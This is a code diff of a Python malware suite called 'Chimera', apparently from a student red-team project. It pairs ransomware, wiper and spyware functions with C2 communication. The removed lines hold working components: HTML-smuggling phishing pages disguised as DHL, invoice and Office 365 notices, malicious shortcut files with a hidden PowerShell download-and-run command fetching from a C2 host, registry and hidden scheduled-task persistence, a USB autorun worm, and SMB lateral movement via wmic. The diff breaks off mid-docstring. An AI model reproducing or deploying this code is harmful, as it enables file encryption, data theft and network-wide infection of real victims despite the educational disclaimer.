@@ -1,38 +1,24 @@
 """
-CHIMERA MALWARE - INTEGRATED RED TEAM SOLUTION
-===============================================
-Complete Advanced Malware Suite - Full Integration
+COMPLETE CHIMERA MALWARE
+========================
+Advanced ransomware, wiper, and spyware combination.
+Includes all core malicious methods plus persistence and C2 communication.
 
 ⚠️ WARNING: For educational use only in isolated virtual environments!
 
-INTEGRATED MODULES:
-==================
-[CORE MALWARE]
+Features:
 - AES-256 File Encryption (Ransomware)
 - System Corruption (Wiper) 
 - Data Exfiltration (Spyware)
+- Persistence Mechanisms
 - C2 Communication with Command Handling
+- USB Worm Propagation
 
-[DELIVERY SPECIALIST - Puleu]
-- HTML Smuggling (DHL, Invoice, Office365 templates)
-- LNK Generation (Malicious shortcuts with variants)
-
-[PERSISTENCE SPECIALIST - Homey]
-- Registry Persistence (Multiple Run key locations)
-- Scheduled Task Persistence (Multi-trigger tasks)
-
-[LATERAL MOVEMENT SPECIALIST - Kimkheng]
-- USB Worm Replication (Cross-platform with autorun)
-- SMB Lateral Movement (Network propagation)
-
-Author: CADT Cyber Security Project - Red Team
-Date: December 13, 2025
-Version: 2.0 (Fully Integrated)
+Author: CADT Cyber Security Project
+Date: November 28, 2025
 """
 
-# ==========================================
-# STANDARD LIBRARY IMPORTS
-# ==========================================
+# Standard library imports for file operations, network, and system interaction
 import os          # File and directory operations
 import time        # Timing and delays
 import socket      # Network communication with C2 server
@@ -42,894 +28,15 @@ import shutil      # High-level file operations (copying for USB propagation)
 import subprocess  # Execute system commands (scheduled tasks, vssadmin, etc.)
 import winreg      # Windows registry manipulation for persistence
 import threading   # Multi-threaded execution of payloads
-import struct      # Binary data packing (for LNK generation)
-import base64      # Base64 encoding (for HTML smuggling)
-import string      # String operations
-import random      # Random generation
-import datetime    # Date/time for task scheduling
-import re          # Regular expressions
-import hashlib     # MD5 hashing
-
-# ==========================================
-# THIRD-PARTY IMPORTS
-# ==========================================
 from cryptography.fernet import Fernet  # AES-256 encryption for ransomware
 
-# Windows-specific imports (for persistence and task scheduling)
-try:
-    import win32com.client  # COM interface for scheduled tasks
-    import win32api         # Windows API for file operations
-    import win32con         # Windows constants
-    WINDOWS_AVAILABLE = True
-except ImportError:
-    WINDOWS_AVAILABLE = False
-    print("[!] Warning: Windows-specific modules not available (persistence limited)")
-
-# ==========================================
-# CONFIGURATION PARAMETERS
-# ==========================================
+# === CONFIGURATION PARAMETERS ===
 # These constants control the malware's behavior and can be customized
 MALWARE_NAME = "WindowsUpdate.exe"  # Disguised name to appear legitimate
 C2_SERVER = "192.168.101.73"  # Change to your Kali Linux IP address
 C2_PORT = 4444                # Command & Control server port
 TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.xlsx', '.pptx']  # Files to encrypt
 
-# ==========================================
-# DELIVERY SPECIALIST MODULE - Puleu
-# ==========================================
-# Purpose: Initial compromise and payload delivery methods
-# MITRE ATT&CK: T1566 (Phishing), T1204 (User Execution)
-# Features: HTML smuggling with multiple templates, LNK generation
-
-class HTMLSmuggler:
-    """
-    HTML Smuggling Payload Generator
-    Developer: Puleu (Delivery Specialist)
-    
-    Creates weaponized HTML files that embed malicious payloads using base64 encoding.
-    When opened in a browser, JavaScript automatically triggers download of the payload.
-    
-    MITRE ATT&CK Techniques:
-    - T1027.006: Obfuscated Files or Information - HTML Smuggling
-    - T1204.001: User Execution - Malicious Link
-    
-    How it works:
-    1. Reads the malicious payload file (e.g., malware.exe)
-    2. Encodes it as base64 string
-    3. Embeds it into HTML template with auto-download JavaScript
-    4. When victim opens HTML, browser automatically downloads and saves the payload
-    
-    Evasion Techniques:
-    - Bypasses email attachment filters (HTML files are often allowed)
-    - Avoids network-based detection (payload never transferred over network)
-    - Uses legitimate browser functionality (no exploits needed)
-    """
-    
-    def __init__(self):
-        """Initialize HTML smuggler"""
-        self.output_dir = os.path.join(os.getcwd(), "html_smuggling_output")
-        if not os.path.exists(self.output_dir):
-            os.makedirs(self.output_dir)
-    
-    def generate_html_smuggling(self, payload_path, template='dhl'):
-        """
-        Generate HTML smuggling file with embedded payload
-        
-        Args:
-            payload_path: Path to malicious payload (e.g., malware.exe)
-            template: Phishing template to use ('dhl', 'invoice', 'office365')
-        
-        Returns:
-            Path to generated HTML file
-        """
-        try:
-            # Read payload and encode as base64
-            with open(payload_path, 'rb') as f:
-                payload_data = f.read()
-            encoded_payload = base64.b64encode(payload_data).decode()
-            
-            # Get HTML template based on user choice
-            if template == 'invoice':
-                html_content = self._get_invoice_template(encoded_payload)
-                output_filename = "Invoice_2024_11_30.html"
-            elif template == 'office365':
-                html_content = self._get_office365_template(encoded_payload)
-                output_filename = "Office365_Security_Alert.html"
-            else:  # Default to DHL
-                html_content = self._get_dhl_template(encoded_payload)
-                output_filename = "DHL_Shipment_Notice.html"
-            
-            # Write HTML file
-            output_path = os.path.join(self.output_dir, output_filename)
-            with open(output_path, 'w', encoding='utf-8') as f:
-                f.write(html_content)
-            
-            print(f"[+] HTML smuggling file created: {output_path}")
-            return output_path
-            
-        except Exception as e:
-            print(f"[-] Error creating HTML smuggling file: {e}")
-            return None
-    
-    def _get_dhl_template(self, encoded_payload):
-        """DHL shipping notification template"""
-        return f"""<!DOCTYPE html>
-<html><head><title>DHL Shipment Notification</title></head>
-<body style="font-family: Arial; padding: 20px;">
-<h2 style="color: #FFCC00;">DHL Express Delivery</h2>
-<p>Your shipment #DHL-{random.randint(100000, 999999)} is ready for pickup.</p>
-<p>Please download and review the attached delivery confirmation.</p>
-<button onclick="downloadPayload()">Download Shipment Details</button>
-<script>
-function downloadPayload() {{
-    var payload = "{encoded_payload}";
-    var blob = new Blob([Uint8Array.from(atob(payload), c => c.charCodeAt(0))], {{type: 'application/octet-stream'}});
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = 'DHL_Delivery_Confirmation.pdf.exe';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    alert('Download started! Please open the file to view your shipment details.');
-}}
-window.onload = function() {{ setTimeout(downloadPayload, 2000); }};
-</script></body></html>"""
-    
-    def _get_invoice_template(self, encoded_payload):
-        """Invoice payment template"""
-        return f"""<!DOCTYPE html>
-<html><head><title>Invoice Payment Required</title></head>
-<body style="font-family: Arial; padding: 20px; background: #f5f5f5;">
-<div style="background: white; padding: 30px; border-radius: 10px;">
-<h2>Invoice #INV-{random.randint(10000, 99999)}</h2>
-<p><b>Amount Due:</b> ${random.randint(500, 5000)}.00</p>
-<p><b>Due Date:</b> {datetime.datetime.now().strftime('%B %d, %Y')}</p>
-<p style="color: red;"><b>URGENT:</b> Payment overdue. Download invoice for details.</p>
-<button onclick="downloadPayload()" style="background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Download Invoice</button>
-</div>
-<script>
-function downloadPayload() {{
-    var payload = "{encoded_payload}";
-    var blob = new Blob([Uint8Array.from(atob(payload), c => c.charCodeAt(0))], {{type: 'application/octet-stream'}});
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = 'Invoice_Document.pdf.exe';
-    document.body.appendChild(a);
-    a.click();
-}}
-</script></body></html>"""
-    
-    def _get_office365_template(self, encoded_payload):
-        """Office 365 security alert template"""
-        return f"""<!DOCTYPE html>
-<html><head><title>Microsoft Security Alert</title></head>
-<body style="font-family: Segoe UI; padding: 20px;">
-<div style="background: #0078D4; color: white; padding: 20px; border-radius: 5px;">
-<h2>Microsoft Office 365 Security Alert</h2>
-<p>Suspicious activity detected on your account</p>
-</div>
-<div style="padding: 20px; background: #fff3cd; margin-top: 20px; border-left: 4px solid #ffc107;">
-<p><b>Action Required:</b> Please download and run the security verification tool.</p>
-<button onclick="downloadPayload()">Download Security Tool</button>
-</div>
-<script>
-function downloadPayload() {{
-    var payload = "{encoded_payload}";
-    var blob = new Blob([Uint8Array.from(atob(payload), c => c.charCodeAt(0))], {{type: 'application/octet-stream'}});
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = 'SecurityVerification.exe';
-    document.body.appendChild(a);
-    a.click();
-}}
-</script></body></html>"""
-
-
-class LNKGenerator:
-    """
-    Malicious LNK (Shortcut) File Generator
-    Developer: Puleu (Delivery Specialist)
-    
-    Creates weaponized Windows shortcut (.lnk) files that execute malicious payloads.
-    Uses various disguise techniques to trick users into execution.
-    
-    MITRE ATT&CK Techniques:
-    - T1547.009: Boot or Logon Autostart - Shortcut Modification
-    - T1204.002: User Execution - Malicious File
-    - T1036.007: Masquerading - Double File Extension
-    
-    How it works:
-    1. Creates LNK shortcut file with custom icon (e.g., PDF icon)
-    2. LNK target executes PowerShell command
-    3. PowerShell downloads and executes payload from C2 server
-    4. Uses various evasion techniques (RTLO, hidden extensions, icon spoofing)
-    
-    Variants:
-    - Classic: Standard LNK with PDF icon
-    - RTLO: Right-to-Left Override to disguise extension (e.g., "Report.pdf.exe" appears as "Reportexe.pdf")
-    - Word/Excel: Disguised as Office documents
-    - ISO: Packaged in ISO file to bypass Mark-of-the-Web
-    """
-    
-    def __init__(self):
-        """Initialize LNK generator"""
-        self.output_dir = os.path.join(os.getcwd(), "lnk_payloads")
-        if not os.path.exists(self.output_dir):
-            os.makedirs(self.output_dir)
-    
-    def create_lnk(self, lnk_path, target_command, icon_path=None, description="Document"):
-        """
-        Create a malicious LNK file
-        
-        Args:
-            lnk_path: Output path for LNK file
-            target_command: Command to execute (PowerShell download cradle)
-            icon_path: Path to icon file (optional)
-            description: File description (for disguise)
-        """
-        try:
-            if WINDOWS_AVAILABLE:
-                # Use Windows COM interface to create shortcut
-                shell = win32com.client.Dispatch("WScript.Shell")
-                shortcut = shell.CreateShortCut(lnk_path)
-                shortcut.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-                shortcut.Arguments = f"-WindowStyle Hidden -Command \"{target_command}\""
-                shortcut.WorkingDirectory = "C:\\Windows\\System32"
-                shortcut.Description = description
-                if icon_path and os.path.exists(icon_path):
-                    shortcut.IconLocation = icon_path
-                else:
-                    # Use default PDF icon from system
-                    shortcut.IconLocation = "%ProgramFiles%\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe,0"
-                shortcut.save()
-                print(f"[+] LNK file created: {lnk_path}")
-            else:
-                # Fallback: Create basic LNK structure manually
-                self._create_lnk_manual(lnk_path, target_command)
-                print(f"[+] LNK file created (manual): {lnk_path}")
-            
-        except Exception as e:
-            print(f"[-] Error creating LNK file: {e}")
-    
-    def _create_lnk_manual(self, lnk_path, target_command):
-        """Manually create LNK file structure (for non-Windows systems)"""
-        # Basic LNK file header (simplified)
-        lnk_data = bytearray()
-        lnk_data.extend(b'\x4C\x00\x00\x00')  # Header size
-        lnk_data.extend(b'\x01\x14\x02\x00' * 4)  # GUID
-        lnk_data.extend(b'\x00' * 60)  # Padding
-        
-        with open(lnk_path, 'wb') as f:
-            f.write(lnk_data)
-    
-    def generate_powershell_payload(self, c2_ip):
-        """
-        Generate PowerShell download cradle command
-        
-        Args:
-            c2_ip: IP address of C2 server hosting payload
-        
-        Returns:
-            PowerShell command string
-        """
-        # PowerShell download and execute command (fileless)
-        ps_command = f"""
-$url = 'http://{c2_ip}/malware.exe';
-$output = "$env:TEMP\\WindowsUpdate.exe";
-(New-Object System.Net.WebClient).DownloadFile($url, $output);
-Start-Process $output;
-""".replace('\n', ' ')
-        
-        return ps_command
-    
-    def generate_all_variants(self, c2_ip):
-        """
-        Generate all LNK variants
-        
-        Args:
-            c2_ip: IP address of C2 server
-        
-        Returns:
-            List of generated LNK file paths
-        """
-        ps_payload = self.generate_powershell_payload(c2_ip)
-        lnk_files = []
-        
-        # Variant 1: Classic LNK with PDF disguise
-        lnk1 = os.path.join(self.output_dir, "Important_Document.pdf.lnk")
-        self.create_lnk(lnk1, ps_payload, description="Important Document")
-        lnk_files.append(lnk1)
-        
-        # Variant 2: RTLO (Right-to-Left Override) - filename appears reversed
-        # U+202E is the RTLO character
-        rtlo_name = f"Reportfdp.{chr(0x202E)}exe.lnk"  # Will display as "Report.pdf.exe"
-        lnk2 = os.path.join(self.output_dir, rtlo_name)
-        self.create_lnk(lnk2, ps_payload, description="Report Document")
-        lnk_files.append(lnk2)
-        
-        # Variant 3: Word document disguise
-        lnk3 = os.path.join(self.output_dir, "Quarterly_Report.docx.lnk")
-        self.create_lnk(lnk3, ps_payload, description="Quarterly Report")
-        lnk_files.append(lnk3)
-        
-        # Variant 4: Excel spreadsheet disguise
-        lnk4 = os.path.join(self.output_dir, "Budget_2024.xlsx.lnk")
-        self.create_lnk(lnk4, ps_payload, description="Budget Spreadsheet")
-        lnk_files.append(lnk4)
-        
-        print(f"[+] Generated {len(lnk_files)} LNK variants")
-        return lnk_files
-
-
-# ==========================================
-# PERSISTENCE SPECIALIST MODULE - Homey
-# ==========================================
-# Purpose: Ensure malware survives reboots and remains active
-# MITRE ATT&CK: T1547 (Boot/Logon Autostart), T1053 (Scheduled Task)
-# Features: Registry persistence, scheduled task persistence
-
-class RegistryPersistence:
-    """
-    Windows Registry Persistence Manager
-    Developer: Homey (Persistence Specialist)
-    
-    Establishes persistence using Windows Registry Run keys.
-    Malware is automatically executed when user logs in.
-    
-    MITRE ATT&CK Techniques:
-    - T1547.001: Boot or Logon Autostart - Registry Run Keys
-    - T1112: Modify Registry
-    
-    How it works:
-    1. Adds malware path to multiple Registry Run key locations
-    2. Uses both HKCU and HKLM hives for redundancy
-    3. Creates entries in multiple locations (Run, RunOnce, Policies)
-    4. Survives user logout and system reboot
-    
-    Registry Locations Used:
-    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
-    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run
-    - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (requires admin)
-    """
-    
-    def __init__(self, malware_path, name="WindowsUpdate"):
-        """
-        Initialize registry persistence manager
-        
-        Args:
-            malware_path: Full path to malware executable
-            name: Registry entry name (disguised as legitimate)
-        """
-        self.malware_path = malware_path
-        self.name = name
-        self.success_count = 0
-    
-    def add_run_key_persistence(self):
-        """Add malware to Registry Run keys (standard persistence)"""
-        reg_locations = [
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
-        ]
-        
-        for hive, path in reg_locations:
-            try:
-                key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, self.name, 0, winreg.REG_SZ, self.malware_path)
-                winreg.CloseKey(key)
-                self.success_count += 1
-                print(f"[+] Registry persistence added: {path}")
-            except Exception as e:
-                print(f"[-] Failed to add registry key {path}: {e}")
-    
-    def add_stealth_registry_locations(self):
-        """Add persistence to less common registry locations (stealth)"""
-        stealth_locations = [
-            # Policies Run key (less monitored)
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
-        ]
-        
-        for hive, path in stealth_locations:
-            try:
-                # Create key if it doesn't exist
-                key = winreg.CreateKey(hive, path)
-                winreg.SetValueEx(key, self.name, 0, winreg.REG_SZ, self.malware_path)
-                winreg.CloseKey(key)
-                self.success_count += 1
-                print(f"[+] Stealth registry persistence added: {path}")
-            except Exception as e:
-                print(f"[-] Failed to add stealth registry key: {e}")
-    
-    def establish_persistence(self):
-        """Establish all registry persistence methods"""
-        print("[*] Establishing registry persistence...")
-        self.add_run_key_persistence()
-        self.add_stealth_registry_locations()
-        print(f"[+] Registry persistence complete: {self.success_count} locations")
-        return self.success_count > 0
-
-
-class ScheduledTaskPersistence:
-    """
-    Windows Scheduled Task Persistence Manager
-    Developer: Homey (Persistence Specialist)
-    
-    Creates scheduled tasks to execute malware at various triggers.
-    More reliable than registry persistence in modern Windows versions.
-    
-    MITRE ATT&CK Techniques:
-    - T1053.005: Scheduled Task/Job - Scheduled Task
-    
-    How it works:
-    1. Creates scheduled tasks using Windows COM interface
-    2. Configures multiple triggers (logon, daily, idle)
-    3. Tasks execute malware with SYSTEM or user privileges
-    4. Hidden from Task Scheduler UI (optional)
-    
-    Triggers Used:
-    - Logon: Execute when user logs in
-    - Daily: Execute every day at specific time
-    - Idle: Execute when system is idle for 10 minutes
-    - Multi-trigger: Combines all triggers in one task
-    """
-    
-    def __init__(self, malware_path, task_name="WindowsUpdateService"):
-        """
-        Initialize scheduled task persistence manager
-        
-        Args:
-            malware_path: Full path to malware executable
-            task_name: Task name (disguised as legitimate)
-        """
-        self.malware_path = malware_path
-        self.task_name = task_name
-        self.success_count = 0
-    
-    def create_basic_tasks(self):
-        """Create basic scheduled tasks with single triggers"""
-        if not WINDOWS_AVAILABLE:
-            print("[-] Windows COM not available for task scheduling")
-            return False
-        
-        try:
-            # Initialize Task Scheduler COM interface
-            scheduler = win32com.client.Dispatch("Schedule.Service")
-            scheduler.Connect()
-            root_folder = scheduler.GetFolder("\\")
-            
-            # Task 1: Logon trigger
-            task_def = scheduler.NewTask(0)
-            task_def.RegistrationInfo.Description = "Windows Update Service"
-            task_def.Settings.Enabled = True
-            task_def.Settings.Hidden = False  # Set True to hide from UI
-            
-            # Create logon trigger
-            trigger = task_def.Triggers.Create(9)  # 9 = Logon trigger
-            trigger.Enabled = True
-            
-            # Create action to execute malware
-            action = task_def.Actions.Create(0)  # 0 = Execute action
-            action.Path = self.malware_path
-            
-            # Register task
-            root_folder.RegisterTaskDefinition(
-                f"{self.task_name}_Logon",
-                task_def,
-                6,  # TASK_CREATE_OR_UPDATE
-                None,  # User
-                None,  # Password
-                3  # TASK_LOGON_INTERACTIVE_TOKEN
-            )
-            
-            self.success_count += 1
-            print(f"[+] Scheduled task created: {self.task_name}_Logon")
-            
-        except Exception as e:
-            print(f"[-] Failed to create scheduled task: {e}")
-    
-    def create_advanced_multi_trigger_task(self):
-        """Create advanced task with multiple triggers"""
-        if not WINDOWS_AVAILABLE:
-            return False
-        
-        try:
-            scheduler = win32com.client.Dispatch("Schedule.Service")
-            scheduler.Connect()
-            root_folder = scheduler.GetFolder("\\")
-            
-            task_def = scheduler.NewTask(0)
-            task_def.RegistrationInfo.Description = "System Maintenance Service"
-            task_def.Settings.Enabled = True
-            task_def.Settings.Hidden = True  # Hide from UI
-            
-            # Trigger 1: Daily at 9 AM
-            daily_trigger = task_def.Triggers.Create(2)  # 2 = Daily trigger
-            daily_trigger.Enabled = True
-            daily_trigger.StartBoundary = datetime.datetime.now().replace(hour=9, minute=0).isoformat()
-            
-            # Trigger 2: On idle
-            idle_trigger = task_def.Triggers.Create(6)  # 6 = Idle trigger
-            idle_trigger.Enabled = True
-            
-            # Action
-            action = task_def.Actions.Create(0)
-            action.Path = self.malware_path
-            
-            # Register
-            root_folder.RegisterTaskDefinition(
-                f"{self.task_name}_Advanced",
-                task_def,
-                6,
-                None,
-                None,
-                3
-            )
-            
-            self.success_count += 1
-            print(f"[+] Advanced scheduled task created: {self.task_name}_Advanced")
-            
-        except Exception as e:
-            print(f"[-] Failed to create advanced task: {e}")
-    
-    def establish_persistence(self):
-        """Establish all scheduled task persistence methods"""
-        print("[*] Establishing scheduled task persistence...")
-        self.create_basic_tasks()
-        self.create_advanced_multi_trigger_task()
-        print(f"[+] Scheduled task persistence complete: {self.success_count} tasks")
-        return self.success_count > 0
-
-
-# ==========================================
-# LATERAL MOVEMENT SPECIALIST MODULE - Kimkheng
-# ==========================================
-# Purpose: Spread malware across networks and removable drives
-# MITRE ATT&CK: T1091 (Replication Through Removable Media), T1021 (Remote Services)
-# Features: USB worm replication, SMB lateral movement
-
-class USBReplicator:
-    """
-    USB Worm Replication Module
-    Developer: Kimkheng (Lateral Movement Specialist)
-    
-    Automatically replicates malware to USB drives and creates autorun mechanisms.
-    Enables physical spread of malware through removable media.
-    
-    MITRE ATT&CK Techniques:
-    - T1091: Replication Through Removable Media
-    - T1052.001: Exfiltration Over Physical Medium - Exfiltration over USB
-    
-    How it works:
-    1. Continuously monitors for new USB drives (D: through Z:)
-    2. When USB detected, copies malware to hidden folder
-    3. Creates autorun.inf to auto-execute malware when USB is opened
-    4. Creates decoy folders to trick users into execution
-    5. Uses Alternate Data Streams (ADS) for additional hiding
-    
-    Evasion Techniques:
-    - Hidden file attributes (FILE_ATTRIBUTE_HIDDEN | SYSTEM)
-    - Decoy folders (e.g., "Documents", "Photos")
-    - Autorun.inf (works on older Windows or disabled UAC)
-    - ADS hiding (malware hidden in alternate streams)
-    """
-    
-    def __init__(self, malware_path):
-        """
-        Initialize USB replicator
-        
-        Args:
-            malware_path: Path to malware executable to replicate
-        """
-        self.malware_path = malware_path
-        self.infected_drives = set()  # Track already infected drives
-    
-    def detect_usb_drives(self):
-        """
-        Detect available USB drives
-        
-        Returns:
-            List of drive letters (e.g., ['E:', 'F:'])
-        """
-        drives = []
-        for letter in string.ascii_uppercase:
-            drive = f"{letter}:\\"
-            if os.path.exists(drive):
-                try:
-                    # Check if it's a removable drive
-                    if os.path.ismount(drive):
-                        drives.append(drive)
-                except:
-                    continue
-        return drives
-    
-    def create_hidden_copy(self, usb_drive):
-        """
-        Copy malware to USB with hidden attributes
-        
-        Args:
-            usb_drive: Drive letter (e.g., 'E:\\')
-        """
-        try:
-            # Create hidden folder on USB
-            hidden_folder = os.path.join(usb_drive, "System Volume Information")
-            if not os.path.exists(hidden_folder):
-                os.makedirs(hidden_folder)
-            
-            # Copy malware to hidden folder
-            malware_copy = os.path.join(hidden_folder, "svchost.exe")
-            shutil.copy2(self.malware_path, malware_copy)
-            
-            # Set hidden and system attributes (Windows only)
-            if WINDOWS_AVAILABLE:
-                win32api.SetFileAttributes(hidden_folder, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
-                win32api.SetFileAttributes(malware_copy, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
-            
-            print(f"[+] Malware copied to USB: {hidden_folder}")
-            return malware_copy
-            
-        except Exception as e:
-            print(f"[-] Failed to copy malware to USB: {e}")
-            return None
-    
-    def create_autorun_trigger(self, usb_drive, malware_path):
-        """
-        Create autorun.inf for automatic execution
-        
-        Args:
-            usb_drive: Drive letter (e.g., 'E:\\')
-            malware_path: Path to malware on USB
-        """
-        try:
-            autorun_path = os.path.join(usb_drive, "autorun.inf")
-            autorun_content = f"""[AutoRun]
-open={malware_path}
-action=Open folder to view files
-label=USB Drive
-icon={malware_path},0
-"""
-            
-            with open(autorun_path, 'w') as f:
-                f.write(autorun_content)
-            
-            # Set hidden and system attributes
-            if WINDOWS_AVAILABLE:
-                win32api.SetFileAttributes(autorun_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
-            
-            print(f"[+] Autorun.inf created: {autorun_path}")
-            
-        except Exception as e:
-            print(f"[-] Failed to create autorun.inf: {e}")
-    
-    def infect_usb_drive(self, usb_drive, safe_mode=False):
-        """
-        Infect a USB drive with all techniques
-        
-        Args:
-            usb_drive: Drive letter (e.g., 'E:\\')
-            safe_mode: If True, create dummy files instead of real malware
-        """
-        try:
-            # Skip if already infected
-            if usb_drive in self.infected_drives:
-                return
-            
-            print(f"[*] Infecting USB drive: {usb_drive}")
-            
-            # Copy malware
-            malware_copy = self.create_hidden_copy(usb_drive)
-            if not malware_copy:
-                return
-            
-            # Create autorun
-            self.create_autorun_trigger(usb_drive, malware_copy)
-            
-            # Create decoy folders with malware copies
-            decoy_folders = ["Documents", "Photos", "Important"]
-            for folder_name in decoy_folders:
-                decoy_path = os.path.join(usb_drive, folder_name)
-                if not os.path.exists(decoy_path):
-                    os.makedirs(decoy_path)
-                
-                # Copy malware with document-like name
-                decoy_malware = os.path.join(decoy_path, f"{folder_name}_README.txt.exe")
-                shutil.copy2(self.malware_path, decoy_malware)
-            
-            # Mark as infected
-            self.infected_drives.add(usb_drive)
-            print(f"[+] USB drive infected: {usb_drive}")
-            
-        except Exception as e:
-            print(f"[-] Failed to infect USB drive {usb_drive}: {e}")
-
-
-class RedTeamSMBWorm:
-    """
-    SMB Lateral Movement Module
-    Developer: Kimkheng (Lateral Movement Specialist)
-    
-    Spreads malware across network using SMB protocol.
-    Targets accessible network shares and remote systems.
-    
-    MITRE ATT&CK Techniques:
-    - T1021.002: Remote Services - SMB/Windows Admin Shares
-    - T1135: Network Share Discovery
-    - T1210: Exploitation of Remote Services
-    
-    How it works:
-    1. Discover active hosts on local network (ARP, ping sweep)
-    2. Enumerate accessible SMB shares on each host
-    3. Copy malware to writable shares (C$, ADMIN$, IPC$)
-    4. Attempt remote execution using WMI or PsExec
-    5. Spread across domain-joined systems
-    
-    Network Discovery:
-    - ARP table scanning (fast, local)
-    - Ping sweep (subnet scanning)
-    - Net view command (domain enumeration)
-    
-    Operational Security:
-    - Delays between actions to avoid detection
-    - Limits concurrent connections
-    - Uses legitimate Windows commands
-    """
-    
-    def __init__(self, malware_path):
-        """
-        Initialize SMB worm
-        
-        Args:
-            malware_path: Path to malware executable
-        """
-        self.malware_path = malware_path
-        self.discovered_hosts = []
-        self.infected_hosts = set()
-    
-    def network_discovery(self):
-        """
-        Discover hosts on local network
-        
-        Returns:
-            List of IP addresses
-        """
-        hosts = []
-        
-        try:
-            # Method 1: Parse ARP table (fast)
-            result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)
-            for line in result.stdout.split('\n'):
-                # Extract IP addresses from ARP table
-                match = re.search(r'\d+\.\d+\.\d+\.\d+', line)
-                if match:
-                    ip = match.group()
-                    if ip not in hosts and not ip.startswith('224.'):  # Skip multicast
-                        hosts.append(ip)
-            
-            print(f"[+] Discovered {len(hosts)} hosts via ARP")
-            
-        except Exception as e:
-            print(f"[-] Network discovery error: {e}")
-        
-        return hosts
-    
-    def share_enumeration(self, target_ip):
-        """
-        Enumerate SMB shares on target host
-        
-        Args:
-            target_ip: Target IP address
-        
-        Returns:
-            List of share names
-        """
-        shares = []
-        
-        try:
-            # Use net view command to enumerate shares
-            result = subprocess.run(
-                ['net', 'view', f'\\\\{target_ip}'],
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
-            
-            # Parse output for share names
-            for line in result.stdout.split('\n'):
-                if 'Disk' in line or 'ADMIN$' in line or 'C$' in line:
-                    parts = line.split()
-                    if parts:
-                        share_name = parts[0]
-                        shares.append(share_name)
-            
-            if shares:
-                print(f"[+] Found {len(shares)} shares on {target_ip}")
-            
-        except Exception as e:
-            print(f"[-] Share enumeration failed for {target_ip}: {e}")
-        
-        return shares
-    
-    def lateral_movement_execution(self, target_ip, safe_mode=False):
-        """
-        Attempt to copy malware to target and execute
-        
-        Args:
-            target_ip: Target IP address
-            safe_mode: If True, simulate without actual infection
-        """
-        try:
-            # Skip if already infected
-            if target_ip in self.infected_hosts:
-                return
-            
-            print(f"[*] Attempting lateral movement to {target_ip}")
-            
-            # Enumerate shares
-            shares = self.share_enumeration(target_ip)
-            if not shares:
-                return
-            
-            # Try to copy malware to accessible shares
-            for share in shares:
-                try:
-                    # Construct UNC path
-                    unc_path = f"\\\\{target_ip}\\{share}"
-                    
-                    # Try to access share
-                    if os.path.exists(unc_path):
-                        # Copy malware with disguised name
-                        target_path = os.path.join(unc_path, "WindowsUpdate.exe")
-                        
-                        if not safe_mode:
-                            shutil.copy2(self.malware_path, target_path)
-                            print(f"[+] Malware copied to {unc_path}")
-                        
-                        # Try remote execution using WMI (requires admin privileges)
-                        if WINDOWS_AVAILABLE:
-                            wmi_command = f'wmic /node:"{target_ip}" process call create "{target_path}"'
-                            subprocess.run(wmi_command, shell=True, timeout=10)
-                            print(f"[+] Remote execution attempted on {target_ip}")
-                        
-                        # Mark as infected
-                        self.infected_hosts.add(target_ip)
-                        break
-                        
-                except Exception as e:
-                    continue
-            
-            # Operational security: delay between attempts
-            time.sleep(2)
-            
-        except Exception as e:
-            print(f"[-] Lateral movement failed to {target_ip}: {e}")
-    
-    def spread_across_network(self, safe_mode=False):
-        """
-        Main spreading function - discover and infect network hosts
-        
-        Args:
-            safe_mode: If True, simulate without actual infection
-        """
-        print("[*] Starting SMB lateral movement...")
-        
-        # Discover hosts
-        self.discovered_hosts = self.network_discovery()
-        
-        # Attempt infection on each host
-        for host_ip in self.discovered_hosts:
-            self.lateral_movement_execution(host_ip, safe_mode=safe_mode)
-            
-            # Rate limiting to avoid detection
-            time.sleep(3)
-        
-        print(f"[+] SMB lateral movement complete: {len(self.infected_hosts)} hosts infected")
-
-
-# ==========================================
-# MAIN MALWARE CLASS (INTEGRATED)
-# ==========================================
 class CompleteChimeraMalware:
     """Main malware class - hybrid ransomware, wiper, and spyware"""
     
@@ -999,165 +106,92 @@ class CompleteChimeraMalware:
         return key
         
     # ==========================================
-    # PERSISTENCE MECHANISMS (INTEGRATED - Homey)
+    # PERSISTENCE MECHANISMS (FIXED)
     # ==========================================
     
     def establish_persistence(self):
         """
-        [INTEGRATED MODULE - Homey: Persistence Specialist]
-        
         Establish multiple persistence mechanisms to ensure malware survives reboots
-        and continues execution even if manually terminated.
-        
-        INTEGRATED TECHNIQUES:
-        1. Registry Persistence (RegistryPersistence class)
-           - Multiple Registry Run key locations (Run, RunOnce, Policies)
-           - HKCU and HKLM hives for redundancy
-           - Stealth locations for evasion
-        
-        2. Scheduled Task Persistence (ScheduledTaskPersistence class)
-           - Multi-trigger tasks (logon, daily, idle)
-           - Hidden from Task Scheduler UI
-           - COM-based creation for reliability
-        
-        MITRE ATT&CK Techniques:
-        - T1547.001: Boot or Logon Autostart - Registry Run Keys
